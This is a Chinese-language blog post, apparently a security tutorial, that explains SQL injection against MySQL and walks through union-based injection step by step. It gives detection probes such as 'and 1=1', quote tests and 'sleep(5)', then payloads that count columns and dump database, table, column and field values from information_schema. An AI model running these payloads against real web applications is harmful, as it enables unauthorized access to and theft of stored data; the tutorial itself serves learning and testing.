---
title: SQL注入
layout: post
background: https://cdnb.artstation.com/p/assets/images/images/007/095/957/large/mark-chang-lab3.jpg
subtitle: 红蓝思路.
artist: artstation.com/antoinecolligsq
---

# sql注入

sql是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。

<br/>

只要功能点和数据库交互的地方都有能存在SQL注入

<br/>不同的数据库有不同注入语句,以下以mysql为例

## 数据库中的关键库,表,字段.

~~~
information_schema库
SCHEMATA表
字段: SCHEMA_NAME
TABLES表
字段:TABLE_SCHEMA TABLE_NAME
COLUMNS表
字段:TABLE_SCHEMA	TABLE_NAME COLUMN_NAME
~~~



## 根据数据类型划分

#### 整型注入（不需要闭合，不一定需要注释） 建议每次都加注释	

#### 字符串类型注入（需要闭合，或者需要注释）

##### 如何判断

第一种	

and 1=1   和 and 1=2 

<br/>

第二种 

+1和-1	(一般建议用-1 加号部分浏览器会将其转译为空格)

<br/>

第三种

' 	"		(通过报错信息可得知闭合条件)	

<br/>

第四种

and  sleep(5)	(通过是否延迟判断)

<br/>

# 根据注入的类型分类

### 可联合查询注入

~~~
union	必须包含相同的列数
order by 查看列数
limit 一个一个打印出来
group_concat()	一次性全部打印
--+	代表注释	也可用%23
~~~



1.判断注入类型

and 1=2  判断是整型还是字符型

'"	字符型的话通过报错信息查看如何闭合

<br/>

2.判断列数 以列数为3为例

order by  列数

<br/>

3.使用占位符 	--查看回显点

union select 1,2,3

<br/>

4.查看数据库名

union select  database(),...

5.爆库,获取表名

union select  1,2,group_concat(table_name)	from information_schema.tables  where table_schema='数据库名' --+

6.爆表,获取字段名

union select 1,2, group_concat(column_name)	from  information_schema.columns  where table_schema='数据库名' and table_name='表名' --+

7.获取字段值

union select  1,group_concat(字段名),group_concat(字段名) from 表名 --+